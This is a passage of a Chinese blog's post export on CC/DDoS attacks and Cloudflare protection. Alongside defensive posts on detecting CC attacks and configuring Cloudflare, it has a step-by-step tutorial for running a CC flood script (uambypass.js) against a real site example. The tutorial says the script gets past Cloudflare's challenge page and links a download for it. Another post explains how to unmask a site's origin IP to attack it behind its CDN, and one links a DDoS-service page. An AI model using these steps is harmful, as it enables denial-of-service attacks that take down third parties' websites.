href="https://www.bing.com/search?q=site:mmy66.cc+-www&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;lq=0&amp;pq=site:mmy66.cc+-www&amp;sc=10-18&amp;sk=&amp;cvid=89BE0244DC4C456F863B0D90DC8AA8E0&amp;ghsh=0&amp;ghacc=0&amp;ghpl=">Bing</a>等传统搜索引擎，比如<span class="p blue">site:baidu.com -www</span>（-就是不包含这个www，来查询）</li><li>通过HTTPS证书来查询(只适用于https网站) ，如：<a href="https://crt.sh/?q=mmy66.cc">crt.sh在线查询</a></li><li>通过爆破子域名工具进行查询：<a href="https://github.com/ring04h/wydomain">Layer子域名爆破机</a>、<a href="https://github.com/aboul3la/Sublist3r">subDomainBrute</a></li></ol><ul><li>Layer子域名爆破机：<br><img src="https://bu.dusays.com/2023/06/14/6489a17dc19dd.png" alt="image.png"></li><li>subDomainBrute：<br><img src="https://bu.dusays.com/2023/06/14/6489a17d9d43b.png" alt="image.png"></li></ul><h2 id="方法3：网站邮件信息"><a href="#方法3：网站邮件信息" class="headerlink" title="方法3：网站邮件信息"></a>方法3：<strong>网站邮件信息</strong></h2><p>一般邮件服务器在内部，没有CDN解析，邮件返回的域名IP可能是真实IP，比如<strong>邮箱注册</strong>、<strong>邮箱找回密码</strong>、<strong>RSS邮件订阅等功能场景</strong>，通过网站给自己<strong>发送邮件</strong>，从而让目标主动暴露他们的<span class="p green">真实的IP</span>，查看邮件头信息，从而获取到网站的<span class="p green">真实IP</span></p><p><img src="https://bu.dusays.com/2023/06/14/6489a6a1d24c9.png" alt="image.png"></p><h2 id="方法4：网络空间安全引擎搜索"><a href="#方法4：网络空间安全引擎搜索" class="headerlink" title="方法4：网络空间安全引擎搜索"></a>方法4：<strong>网络空间安全引擎搜索</strong></h2><p>通过关键字或网站域名，就可以找出被<strong>记录的IP</strong>，很多时候获取到的就是网站的<span class="p green">真实IP</span><br>在线相关查询的网站有：<a href="https://www.zoomeye.org/searchResult?q=mmy66.cc">钟馗之眼</a>、<a href="https://www.shodan.io/search?query=mmy66.cc">Shodan</a>、<a href="https://fofa.info/result?qbase64=bW15NjYuY2M=">Fofa</a></p><p><img src="https://bu.dusays.com/2023/06/14/6489a8476c559.png" alt="image.png"></p><h2 id="方法5：利用SSL证书寻找真实IP"><a href="#方法5：利用SSL证书寻找真实IP" class="headerlink" title="方法5：利用SSL证书寻找真实IP"></a>方法5：<strong>利用SSL证书寻找真实IP</strong></h2><p>证书颁发机构(CA)必须将他们发布的每个<strong>SSL/TLS证书</strong>发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了脚本小子的<strong>常用溯源方法</strong></p><ol><li>在<a href="https://crt.sh/?q=mmy66.cc">crt.sh</a>上查找目标网站SSL证书的HASH，</li><li>然后再用<a href="https://search.censys.io/search?resource=hosts&amp;sort=RELEVANCE&amp;per_page=25&amp;virtual_hosts=EXCLUDE&amp;q=mmy66.cc">Censys</a>搜索该HASH即可得到<span class="p green">真实IP</span>地址</li><li>也可以直接在<a href="https://search.censys.io/search?resource=hosts&amp;sort=RELEVANCE&amp;per_page=25&amp;virtual_hosts=EXCLUDE&amp;q=mmy66.cc">Censys</a>进行搜索主机</li></ol><h2 id="方法6：国外主机解析域名"><a href="#方法6：国外主机解析域名" class="headerlink" title="方法6：国外主机解析域名"></a>方法6：<strong>国外主机解析域名</strong></h2><p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到<span class="p green">真实IP</span><br>海外多PING测试工具推荐：<a href="https://www.host-tracker.com/en/ic/2/1259fa94-aa0a-ee11-84ae-d07b75417133?u=mmy66.cc">host-tracker</a>、<a href="https://www.webpagetest.org/">Catchpoint</a>、<a href="https://dnscheck.pingdom.com/">Pingdom</a></p><div class="note info modern"><p>需要找冷门国外DNS才行，像谷歌的DNS，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一，所以能查到的结果自然会和国内差不了多少</p></div><h2 id="方法7：扫描全网"><a href="#方法7：扫描全网" class="headerlink" title="方法7：扫描全网"></a>方法7：<strong>扫描全网</strong></h2><p>通过<a href="https://github.com/zmap/zmap">Zmap</a>、<a href="https://github.com/robertdavidgraham/masscan">masscan</a>等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站<span class="p green">真实IP</span></p><ol><li><a href="https://github.com/zmap/zmap">Zmap</a>号称是最快的互联网扫描工具，能够在45分钟扫遍全网</li><li><a href="https://github.com/robertdavidgraham/masscan">masscan</a>号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网</li></ol><h2 id="方法8：配置不当导致绕过"><a href="#方法8：配置不当导致绕过" class="headerlink" title="方法8：配置不当导致绕过"></a>方法8：<strong>配置不当导致绕过</strong></h2><p>在配置CDN的时候，需要指定的域名、端口信息，有时候往往小小的细节就容易导致CDN防护被绕过从而暴露<span class="p green">真实IP</span></p><h3 id="比如案例："><a href="#比如案例：" class="headerlink" title="比如案例："></a>比如案例：</h3><ol><li>为了方便用户访问，我们常常将 <strong>blog.mmy66.cc</strong> 和 <strong>mmy66.cc</strong> 解析到同一个站点，而CDN只配置了 <strong>blog.mmy66.cc</strong>，通过访问 <strong>mmy66.cc</strong>，就可以绕过CDN 了</li><li>站点同时支持http和https访问，站长粗心大意CDN只配置 <strong>https协议</strong> 忘记了配置 <strong>http协议</strong> 那么这时访问 <strong>http</strong> 就可以轻易绕过。</li></ol><h2 id="方法9：网站phpinfo-php文件"><a href="#方法9：网站phpinfo-php文件" class="headerlink" title="方法9：网站phpinfo.php文件"></a>方法9：<strong>网站phpinfo.php文件</strong></h2><p>这个命中率很高，很多大站都喜欢放个phpinfo，具体要看路径字典强度，是很容易跑出来的</p><h2 id="方法10：网络抓包"><a href="#方法10：网络抓包" class="headerlink" title="方法10：网络抓包"></a>方法10：<strong>网络抓包</strong></h2><p>如果目标站点有自己的APP，通过抓取APP请求来获取<span class="p green">真实IP</span></p><h1 id="总结：为什么要溯源"><a href="#总结：为什么要溯源" class="headerlink" title="总结：为什么要溯源"></a>总结：<strong>为什么要溯源</strong></h1><ol><li>对于网络安全人员而言，查找到真实的IP地址有助追踪溯源，进一步发现攻击者的线索。</li><li>对于执法机构而言，如果发现互联网上出现非法的行为，可以传唤ISP（互联网服务提供商）获取该IP地址的详细信息，从而打击违法犯罪活动</li><li>对于一些套了CDN的网站，脚本小子无法通过CC击落网站目标，只能查询溯源进行攻击源服务器进行击落</li></ol><div class="note warning flat"><p><span class="p red">特别标注: 本站(mmy66.cc)所有文章仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本站不承担任何法律及连带责任，请遵守中华人民共和国安全法</span></p></div><p>关注本站，后续将带来如何隐藏IP，防止脚本小子进行溯源，文章有疑问的可以在评论区留言<img no-lazy="" class="inline" src="https://bu.dusays.com/2023/06/14/6489b2f681d79.png" style="height:100px;"><span class="p right logo large">~本站已开启评论邮件通知~</span></p>]]></content>
      
      
      <categories>
          
          <category> 测压 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC攻击 </tag>
            
            <tag> CDN溯源技术 </tag>
            
            <tag> CDN防护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分享一个网络僵尸官网单页</title>
      <link href="/archives/5a9296a.html"/>
      <url>/archives/5a9296a.html</url>
      
        <content type="html"><![CDATA[<h1 id="分享一个DDOS官网介绍源码单页"><a href="#分享一个DDOS官网介绍源码单页" class="headerlink" title="分享一个DDOS官网介绍源码单页"></a>分享一个DDOS官网介绍源码单页</h1><h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><div class="note warning flat"><p><span class="p red">此源码没有任何攻击功能，单单一个介绍单页源码</span></p></div><p><img src="https://bu.dusays.com/2023/06/14/6488ac3f12efc.png" alt="image.png"></p><blockquote><p>源码下载地址：<a href="https://wwvu.lanzoum.com/ipmQY0z3g8jc">https://wwvu.lanzoum.com/ipmQY0z3g8jc</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDOS源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudflare加速解析服务 自选节点 优化大陆访问速度</title>
      <link href="/archives/54c35e39.html"/>
      <url>/archives/54c35e39.html</url>
      
        <content type="html"><![CDATA[<h1 id="CloudFlare-加速解析："><a href="#CloudFlare-加速解析：" class="headerlink" title="CloudFlare 加速解析："></a>CloudFlare 加速解析：</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><span class="p green">Cloudfalre</span> 加速解析是由 <mark class="hl-label purple">木木鱼</mark>  向中国大陆用户提供的公共优化服务<p>接入服务节点：<mark class="hl-label green">cf.mmy66.cc</mark> </p><p>接入使用方式类似于其它CDN的CNAME接入，可以为中国大陆用户访问Cloudflare网络节点大幅度加速</p><div class="note warning flat"><p><span class="p red">加速解析仅用于正经网站，非法 网站、搭 梯、过假 墙请绕道，被污染就不再提供服务了！</span></p></div><h3 id="加速前："><a href="#加速前：" class="headerlink" title="加速前："></a>加速前：</h3><p><img src="https://www.helloimg.com/images/2023/06/12/osrNRu.png" alt="image.png"></p><h3 id="加速后："><a href="#加速后：" class="headerlink" title="加速后："></a>加速后：</h3><p><img src="https://bu.dusays.com/2023/07/01/649f0a6ebf387.png" alt="image.png"></p><h1 id="如何接入使用-Cloudflare-加速解析？"><a href="#如何接入使用-Cloudflare-加速解析？" class="headerlink" title="如何接入使用 Cloudflare 加速解析？"></a>如何接入使用 Cloudflare 加速解析？</h1><h2 id="CNAME接入："><a href="#CNAME接入：" class="headerlink" title="CNAME接入："></a>CNAME接入：</h2><ol><li><p>登陆 <a href="https://www.cloudflare.com/">www.cloudflare.com</a>，按网页提示配置域名解析并启用CDN服务，如是<span class="p blue">Plus、</span><span class="p blue">Pro、</span><span class="p blue">Business计划</span>，等待生效后进行下一步（<span class="p red">Free计划</span>使用 <span class="p green">SaaS接入</span>）</p></li><li><p>修改域名NS到第三方DNS解析服务商（需支持分区解析，DNS服务商推荐：<a href="https://wanwang.aliyun.com/domain/dns">Aliyun</a>、<a href="https://www.dnspod.cn/">Dnspod</a></p></li><li><p>在第三方DNS解析服务商中每个子域名配置两条DNS解析：</p><p>海外（全网默认）线路CNAME解析指向：<span class="p blue">域名全称</span>.cdn.cloudflare.net（例如：<span class="p blue">mmy66</span>.xyz.cdn.cloudflare.net，<span class="p red">如不指向，可能会被CloudFlare限制</span>）</p><p>国内（中国大陆）所有运营商线路CNAME解析指向：<span class="p blue">cf.mmy66.cc</span></p></li></ol><h2 id="SaaS接入："><a href="#SaaS接入：" class="headerlink" title="SaaS接入："></a>SaaS接入：</h2><ol><li>准备2个域名，一个<span class="p gray">主域名</span>给用户访问（<strong>a.com</strong>），另一个随意的域名用于回源（<span class="p red">b.com</span>）；外币卡或者已绑卡的 <span class="p gray">PayPal</span></li><li>登陆 <a href="https://www.cloudflare.com/">www.cloudflare.com</a> ，按网页提示配置域名(<span class="p red">b.com</span>)，并在DNS随意解析一个子域名(<span class="p red">cdn.b.com</span>)，并且 <span class="p red">cdn.b.com</span> 的A记录是你的源服务器IP（<span class="p green">服务器设置域名为a.com</span>）</li><li>选择 SSL/TLS – 自定义主机名 – 启用CloudFlare for SaaS 后根据它的提示绑定外币卡或者已绑卡的PayPal（目前免费接入100个域）；自定义主机名设置回退为<span class="p red">cdn.b.com</span> ，然后添加自定义主机名<strong>a.com</strong></li></ol><p><img src="https://www.helloimg.com/images/2023/06/12/osrlL1.png" alt="image.png"></p><ol start="4"><li><p>修改主域名(<strong>a.com</strong>)的NS到第三方DNS解析服务商（需支持分区解析，DNS服务商推荐：<a href="https://wanwang.aliyun.com/domain/dns">Aliyun</a>、<a href="https://www.dnspod.cn/">Dnspod</a>），按自定义主机名的提示解析(<strong>a.com</strong>)两个TXT记录，然后等待cloudflare验证通过</p></li><li><p>在第三方DNS解析服务商中每个子域名(<strong>blog.a.com</strong>)配置两条DNS解析：</p><p>海外（全网默认）线路CNAME解析指向：<span class="p red">cdn.b.com</span>（<span class="p green">如不指向则无法回源到你的源服务器</span>）<br>国内（中国大陆）所有运营商线路CNAME解析指向：<mark class="hl-label green">cf.mmy66.cc</mark> </p></li></ol><div class="note danger flat"><p>木木鱼小知识：一般的CC攻击基本来自国外代理IP，使用SAAS把海外接入Cloudflar，大陆走国内服务器IP，留国外Cloudflar和黑客打去吧😆😆😆😆😆😆</p></div><h1 id="反馈："><a href="#反馈：" class="headerlink" title="反馈："></a>反馈：</h1><ul><li>发现解析 异常/速度慢、不会使用、请带截图在下方评论区反馈留言~ <img no-lazy="" class="inline" src="https://bu.dusays.com/2022/05/19/6285328a83ca7.gif" style="height:40px;"><img no-lazy="" class="inline" src="https://bu.dusays.com/2022/05/19/6285328a83ca7.gif" style="height:40px;"><span class="p right logo large">~本站已开启评论邮件通知~</span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 防护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloudflare自选节点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC攻击教程，一看就会（仅供参考）</title>
      <link href="/archives/50a9f1de.html"/>
      <url>/archives/50a9f1de.html</url>
      
        <content type="html"><![CDATA[<h1 id="CC攻击部署教程："><a href="#CC攻击部署教程：" class="headerlink" title="CC攻击部署教程："></a>CC攻击部署教程：</h1><p><img src="https://www.helloimg.com/images/2023/06/11/os6EAX.jpg" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/06/11/os6J0g.png" alt="image.png"></p><p>首先布置js环境,使用centos7做的演示:</p><span class="p left logo h3">第一步：管理员权限使用curl命令从url下载软件包</span><pre class="line-numbers language-none"><code class="language-none">curl --silent --location https://rpm.nodesource.com/setup_10.x | sudo bash -   </code></pre><span class="p left logo h3">第二步：管理员权限使用yum安装nodejs</span><pre class="line-numbers language-none"><code class="language-none">sudo yum -y install nodejs</code></pre><span class="p left logo h3">第三步：查找node所在位置</span><pre class="line-numbers language-none"><code class="language-none">whereis node</code></pre><span class="p left logo h3">第四步：输入命令node，如果出现版本号 &gt; 则安装js环境成功</span><p>b</p><div class="note blue anzhiyufont anzhiyu-icon-bullhorn disabled"><p>CC攻击必须安装node环境，可自行百度 “如何安装node.js”</p></div><span class="p left logo h3">第第五步：安装CC脚本，上传至服务器或本地linux系统</span><span class="p left logo h3">第六步：给脚本权限</span><pre class="line-numbers language-none"><code class="language-none">chmod 777 uambypass.js</code></pre><span class="p left logo h3">第七步：运行脚本</span><pre class="line-numbers language-none"><code class="language-none">node uambypass.js https://www.baidu.com/ 60 100 http.txt</code></pre><p><img src="https://www.helloimg.com/images/2023/06/11/osD4yM.png" alt="image.png"></p><span class="p left logo h3">注意：</span><ul><li>如遇报错，使用 yum clean all 清理yum包即可</li><li>url需要填写完整</li><li>脚本运行指令：60为测压时间 单位为秒 100是每个IP请求数  http.txt为你的代理IP</li><li>此脚本对IP代理池要求极高  不然效果很差 可穿 <span class="p blue">Cloudflare</span> <span class="p green">UAM</span>盾</li><li>如果攻击效果不明显，请更换代理ip（即httpc.txt）</li></ul><p>来自群友分享CC脚本 <a class="btn-anzhiyu outline" href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&amp;k=LgL23i6a8j0ZnbDTPQsBqWn0JsFTD3BU&amp;authKey=m6N3E3rJRJZL6CVwRPfpkv2p0T2CX%2B5ZFfW2j38kKV5QHwS0IHLl7ER%2BxE%2B1B9jN&amp;noverify=0&amp;group_code=814449041" title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p><p>温馨提示：仅供测试自己站点 <img no-lazy="" class="inline" src="https://bu.dusays.com/2022/05/19/6285328a83ca7.gif" style="height:40px;"> 勿输入正规网址，本章图片均来自互联网收集<img no-lazy="" class="inline" src="https://bu.dusays.com/2023/06/01/647895232e5d5.webp" style="height:1.5em"></p>]]></content>
      
      
      <categories>
          
          <category> 测压 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于CC攻击，网络攻击</title>
      <link href="/archives/428e76ab.html"/>
      <url>/archives/428e76ab.html</url>
      
        <content type="html"><![CDATA[<p>随着网络技术的迅猛发展和普及，网络已改变每一个人的生活和工作方式，网络安全问题也越来越严重。 近几年，网络入侵的频率不断增加,危害性日趋严重,其中<a href="https://baike.baidu.com/item/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/421896?fr=aladdin">分布式拒绝服务攻击（DDoS）</a>的危害最大，DDoS攻击能在短时间内使得被攻击的网络主机彻底丧失正常服务的能力。</p><ul><li><p>CC攻击(ChallengeCoHapsar，挑战黑洞)是DDoS攻击的一种常见类型，攻击者控制某些主机不停地发送大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。</p></li><li><p>CC攻击主要针对WEB服务器发送大量并发请求，重点针对应用程序中比较消耗资源的功能，占用大量系统资源。</p></li><li><p>CC攻击的攻击技术含量和成本很低， 只要有上百个IP，每个IP弄几个进程，就可以有上千个并发请求，很容易让被攻击目标服务器资源耗尽，从而造成网站宕机。</p></li></ul><h1 id="CC攻击的原理："><a href="#CC攻击的原理：" class="headerlink" title="CC攻击的原理："></a>CC攻击的原理：</h1><p><img src="https://www.helloimg.com/images/2023/06/11/osDq3v.jpg" alt="image.png"></p><ul><li><p>CC攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。</p></li><li><p>CC主要是用来消耗服务器资源的，每个人都有这样的体验：当一个网页访问的人数特别多的时候，打开网页就慢了，CC就是模拟多个用户(多少线程就是多少用户)不停地进行访问那些需要大量数据操作(就是需要大量CPU时间)的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。</p></li></ul><p><img src="https://www.helloimg.com/images/2023/06/11/osDxME.png" alt="image.png"></p><h1 id="CC攻击的种类："><a href="#CC攻击的种类：" class="headerlink" title="CC攻击的种类："></a>CC攻击的种类：</h1><p><font face="黑体" color="CornflowerBlue" size="5">直接攻击、代理攻击、僵尸网络攻击、单主机虚拟多IP地址攻击、</font></p><ul><li><p><font face="黑体" color="CornflowerBlue" size="5">直接攻击：</font>主要针对有重要缺陷的 WEB 应用程序，一般说来是程序写的有问题的时候才会出现这种情况，比较少见。<br><img src="https://www.helloimg.com/images/2023/06/11/osDsSX.png" alt="image.png"></p></li><li><p><font face="黑体" color="CornflowerBlue" size="5">僵尸网络攻击：</font>类似于 DDOS 攻击了，从 WEB 应用程序层面上已经无法防御<font face="黑体" color="SteelBlue" size="3">(下图是这两个月挺火的国外网络僵尸“九头蛇”，因价格低很畅销目前已被警方介入调查，但是没什么卵用) </font><br><img src="https://p2.qhimg.com/t011925349dbcfce217.jpg" alt="image.png"></p></li><li><p><font face="黑体" color="CornflowerBlue" size="5">代理攻击：</font>是CC 攻击者一般会操作一批代理服务器，<font face="黑体" color="CornflowerBlue" size="3">比方说 100 个代理，然后每个代理同时发出 10 个请求，这样 WEB 服务器同时收到 1000 个并发请求的，并且在发出请求后，立刻断掉与代理的连接，避免代理返回的数据将本身的带宽堵死，而不能发动再次请求，这时 WEB 服务器会将响应这些请求的进程进行队列，数据库服务器也同样如此，这样一来，正常请求将会被排在很后被处理，就象本来你去食堂吃饭时，一般只有不到十个人在排队，今天前面却插了一千个人，那么轮到你的机会就很小很小了，这时就出现页面打开极其缓慢或者白屏</font><font face="黑体" color="SteelBlue" size="5">(QQ群，TG群很多人在玩耍，俗称“脚本小子” “CC小子”) </font><br><img src="https://www.helloimg.com/images/2023/06/11/osDtQg.jpg" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/06/11/osD4yM.png" alt="image.png"></p></li><li><p><font face="黑体" color="CornflowerBlue" size="5">单主机虚拟多IP地址攻击：</font>攻击者利用一台主机虚构出多个IP地址向目标服务器指定页面发送大量请求，当服务器来不及处理这些访问请求时，将导致该页面不能响应，正常的访问也将被拒绝。</p></li></ul><h1 id="CC攻击与DDOS的区别："><a href="#CC攻击与DDOS的区别：" class="headerlink" title="CC攻击与DDOS的区别："></a>CC攻击与DDOS的区别：</h1><p><font face="黑体" color="CornflowerBlue" size="5">什么是DDOS攻击</font></p><ul><li>DDoS攻击就是分布式的拒绝服务攻击，DDoS攻击手段是在传统的DoS攻击基础之上产生的一类攻击方式。</li><li>单一的DoS攻击一般是采用一对一方式的，随着计算机与网络技术的发展，DoS攻击的困难程度加大了。</li><li>于是就产生了DDoS攻击，它的原理就很简单：计算机与网络的处理能力加大了10倍，用一台攻击机来攻击不再能起作用，那么DDoS就是利用更多的傀儡机来发起进攻，以比从前更大的规模来进攻受害者。</li></ul><p><font face="黑体" color="CornflowerBlue" size="5">在这里补充两点</font></p><ul><li><p>第一就是DDOS攻击不仅能攻击计算机，还能攻击路由器，因为路由器是一台特殊类型的计算机；</p></li><li><p>第二是网速决定攻击的好和快，比如说，如果你一个被限制网速的环境下，它们的攻击效果不是很明显，但是快的网速相比之下更加具有攻击效果。<br><font face="黑体" color="CornflowerBlue" size="5">DDOS与CC两者的区别</font></p></li><li><p>DDoS是针对IP的攻击，而CC攻击的是服务器资源。</p></li></ul><h1 id="如何确定被攻击："><a href="#如何确定被攻击：" class="headerlink" title="如何确定被攻击："></a>如何确定被攻击：</h1><p>CC攻击有一定的隐蔽性，那如何确定服务器正在遭受或者曾经遭受CC攻击呢?<br>可以通过以下三个方法来确定。</p><ol><li>命令行法</li></ol><ul><li>一般遭受CC攻击时，Web服务器会出现80端口对外关闭的现象， 因为这个端口已经被大量的垃圾数据堵塞了正常的连接被中止了。</li><li>可以通过在命令行下输入命令netstat -an来查看，　“SYN_RECEIVED”是TCP连接状态标志，意思是“正在处于连接的初始同步状态 ”，表明无法建立握手应答处于等待状态。</li><li>这就是攻击的特征，一般情况下这样的记录一般都会有很多条，表示来自不同的代理IP的攻击。</li></ul><ol start="2"><li>批处理法</li></ol><ul><li>上述方法需要手工输入命令且如果Web服务器IP连接太多看起来比较费劲，可以建立一个批处理文件，通过该脚本代码确定是否存在CC攻击。<br>脚本筛选出当前所有的到80端口的连接。</li><li>当感觉服务器异常时就可以双击运行该批处理文件，然后在打开的log.log文件中查看所有的连接。</li><li>如果同一个IP有比较多的到服务器的连接，那就基本可以确定该IP正在对服务器进行CC攻击。</li></ul><ol start="3"><li>查看系统日志</li></ol><ul><li>Web日志一般在C:\WINDOWS\system32\LogFiles\HTTPERR目录下，该目录下用类似httperr1.log的日志文件，这个文件就是记录Web访问错误的记录。</li><li>管理员可以依据日志时间属性选择相应的日志打开进行分析是否Web被CC攻击了。</li><li>默认情况下，Web日志记录的项并不是很多，可以通过ⅡS进行设置，让Web日志记录更多的项以便进行安全分析。</li><li>其操作步骤是：“开始→管理工具”打开“Internet信息服务器”，展开左侧的项定位到到相应的Web站点，然后右键点击选择“属性”打开站点属性窗口，在“网站”选项卡下点击“属性”按钮，在“日志记录属性”窗口的“高级”选项卡下可以勾选相应的“扩展属性”，以便让Web日志进行记录。</li><li>比如其中的“发送的字节数”、“接收的字节数”、“所用时间”这三项默认是没有选中的，但在记录判断CC攻击中是非常有用的，可以勾选。</li><li>另外，如果你对安全的要求比较高，可以在“常规”选项卡下对“新日志计划”进行设置，让其“每小时”或者“每一天”进行记录。</li><li>为了便于日后进行分析时好确定时间可以勾选“文件命名和创建使用当地时间”。</li></ul><h1 id="防御思路："><a href="#防御思路：" class="headerlink" title="防御思路："></a>防御思路：</h1><div class="checkbox"><input type="checkbox">            <p>腾讯云</p>            </div><div class="checkbox"><input type="checkbox">            <p>阿里云</p>            </div><div class="checkbox"><input type="checkbox">            <p>海外高防IP</p>            </div><div class="checkbox blue checked"><input type="checkbox" checked="checked">            <p>Cloudflare免费防护</p>            </div><ul><li>感觉写的不错，留下评论哦~  <a href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&amp;k=IpiJWmlUDh3GfpIOVZXUD6lEwpOouDLb&amp;authKey=HlAOQyAqi4qKCk2IOUAtJ223GUynWs9UIGfOmv6vgfB3Q2tC42sz+HUbTdlLLo41&amp;noverify=0&amp;group_code=814449041">L7站长抗压交流群：814449041</a> （提供免费CC机器人测试）<br><img src="https://www.helloimg.com/images/2023/06/10/osp0XE.jpg" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 测压 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudflare免费防护配置教程</title>
      <link href="/archives/50a7fc42.html"/>
      <url>/archives/50a7fc42.html</url>
      
        <content type="html"><![CDATA[<h1 id="Cloudflare免费防护配置教程"><a href="#Cloudflare免费防护配置教程" class="headerlink" title="Cloudflare免费防护配置教程"></a>Cloudflare免费防护配置教程</h1><blockquote><h2 id="CloudFlare介绍"><a href="#CloudFlare介绍" class="headerlink" title="CloudFlare介绍"></a>CloudFlare介绍</h2></blockquote><ul><li>CloudFlare是全球领先的CDN服务提供商，其提供的免费且足量的服务是诸多站长遭受网络攻击时的“避风港<br><img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5V0mrvP2VBMtDDdjsBJJ7j/9b919e8cc563a9e0e2672e2ad958f406/global-immune-system-network-hero-illustration.svg" alt="2022-03-08_02-35-15.jpg"></li></ul><blockquote><h2 id="注册Cloudflare并接入域名："><a href="#注册Cloudflare并接入域名：" class="headerlink" title="注册Cloudflare并接入域名："></a>注册<strong>Cloudflare</strong>并接入域名：</h2></blockquote><ul><li><p>访问：<a href="https://www.cloudflare.com/zh-cn">https://www.cloudflare.com/zh-cn</a>, 注册账号，登录</p></li><li><p>填写您的域名，注意格式为<br><img src="https://www.helloimg.com/images/2023/06/10/osQyrE.png" alt="image.png"></p></li><li><p>选择免费套餐，然后添加记录，填写子域名并修改DNS（DNS在域名注册地修改）<br><img src="https://www.helloimg.com/images/2023/06/10/ospB1Y.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/06/10/ospCl9.png" alt="image.png"></p></li><li><p>我们的域名已经成功Cloudflare了，接下来开始简单配置防护策略</p></li></ul><hr><blockquote><h2 id="开启Cloudflare的防护配置："><a href="#开启Cloudflare的防护配置：" class="headerlink" title="开启Cloudflare的防护配置："></a>开启Cloudflare的防护配置：</h2></blockquote><ul><li><p>点击 <strong>安全性</strong> 开启<strong>DDOS</strong>和<strong>自动程序</strong> ，两个都开启<br><img src="https://www.helloimg.com/images/2023/06/10/ospG6X.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/06/10/ospZRg.png" alt="image.png"></p></li><li><p>配置一下屏蔽海外，针对对一些全国代理的CC，如果你的网站是开放全国的话就不用开启<br><img src="https://www.helloimg.com/images/2023/06/10/ospoLM.png" alt="image.png"></p></li><li><p>速率限制规则也需要开启，主要实现的是同个IP【10秒内请求数&gt;n】时对其返回429阻止访问。如图填写/可对zone下所有域名进行保护，个人博客正常情况下n建议设置为50，资源更多的站点可以考虑适当放大（以不影响正常访问为准）<br><img src="https://www.helloimg.com/images/2023/06/10/ospFQP.png" alt="image.png"></p></li><li><p>最后在开始配置防火墙规则之前，请先前往【防火墙】-【设置】下，将【Privacy Pass支持】关闭，以避免一种绕过质询的可能（尽管如此，免费版的hCaptcha依然存在可绕过的方式，所以在较严重的情况下应适当选择阻止部分访问）。<br><img src="https://www.helloimg.com/images/2023/06/10/ospPu6.png" alt="image.png"></p></li></ul><hr><ul><li><p>这篇博客对于CF WAF的配置分享到此告一段落了，但是对这些规则的应用仍有正则表达式等更高级的应用方式去探索，结合实际，准确地发掘并圈定恶意攻击特征，积极利用好这些已有的资源，最大限度减小对正常用户访问的影响是有必要的。</p></li><li><p>此外本站采用的就是Cloudflare，欢迎各位黑客测试站点的防护强度 </p></li><li><p>用的好的话，留下评论哦~  <a href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&amp;k=IpiJWmlUDh3GfpIOVZXUD6lEwpOouDLb&amp;authKey=HlAOQyAqi4qKCk2IOUAtJ223GUynWs9UIGfOmv6vgfB3Q2tC42sz+HUbTdlLLo41&amp;noverify=0&amp;group_code=814449041">L7站长抗压交流群：814449041</a> （提供免费CC机器人测试）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 防护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN防护 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
